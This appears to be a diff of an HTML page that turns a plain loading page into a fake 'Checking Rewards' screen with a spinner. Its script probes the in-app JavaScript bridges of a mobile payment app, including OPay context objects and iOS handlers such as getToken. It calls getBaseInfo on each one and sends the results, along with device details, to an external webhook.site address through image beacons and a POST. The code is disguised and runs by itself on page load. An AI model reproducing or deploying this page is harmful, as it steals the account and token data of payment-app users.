@@ -1,30 +1,99 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checking Rewards...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+      background: #f4f4f4;
+      color: #333;
+    }
+
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #00c853;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 2s linear infinite;
+      margin: auto;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
 <body>
-<div id="output"></div>
-<script>
-var bridges = ['control', 'history', 'OPay3PartyContext', 'ORideContext'];
-var results = [];
+  <div class="loader"></div>
+  <p>Authenticating session...</p>
+  <div id="debug" style="font-size: 10px; color: #ccc; margin-top: 20px;"></div>
 
-bridges.forEach(function(bridge) {
-  try {
-    var data = JSON.parse(window[bridge].getBaseInfo());
-    results.push({bridge: bridge, data: data});
-    var el = document.createElement('pre');
-    el.style.color = 'red';
-    el.textContent = bridge + '.getBaseInfo() = ' + JSON.stringify(data, null, 2);
-    document.getElementById('output').appendChild(el);
-  } catch(e) {}
-});
+  <script>
+    (function () {
+      var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
+      var results = { platform: navigator.platform, ua: navigator.userAgent, data: {} };
 
-if (results.length > 0) {
-  fetch('https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(results)
-  });
-}
-</script>
+      function log(msg) {
+        document.getElementById('debug').innerText += msg + ' | ';
+        // Exfiltrate instantly via Image for widest compatibility
+        new Image().src = WEBHOOK + '?log=' + encodeURIComponent(msg);
+      }
+
+      function exfil(obj) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', WEBHOOK, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(obj));
+      }
+
+      // Android and older Bridges
+      var bridges = ['control', 'OPay3PartyContext', 'android', 'ORideContext'];
+      bridges.forEach(function (b) {
+        if (window[b] && window[b].getBaseInfo) {
+          try {
+            var info = window[b].getBaseInfo();
+            results.data[b] = info;
+            log('Found ' + b);
+          } catch (e) { log('Error ' + b + ': ' + e.message); }
+        }
+      });
+
+      // iOS WebKit Handlers
+      if (window.webkit && window.webkit.messageHandlers) {
+        log('WebKit handlers found');
+        // Note: getBaseInfo on iOS is usually an async messageHandler
+        // But some older OPay versions injected global objects.
+        // We'll try to trigger a message if we find the handler.
+        var handlers = ['getBaseInfo', 'getToken', 'OPay3PartyContext'];
+        handlers.forEach(function (h) {
+          if (window.webkit.messageHandlers[h]) {
+            log('Handler ' + h + ' exists');
+            try {
+              window.webkit.messageHandlers[h].postMessage({ call: 'getBaseInfo' });
+            } catch (e) { }
+          }
+        });
+      }
+
+      // Final exfil
+      setTimeout(function () {
+        exfil(results);
+        log('Done');
+      }, 1000);
+    })();
+  </script>
 </body>
+
 </html>
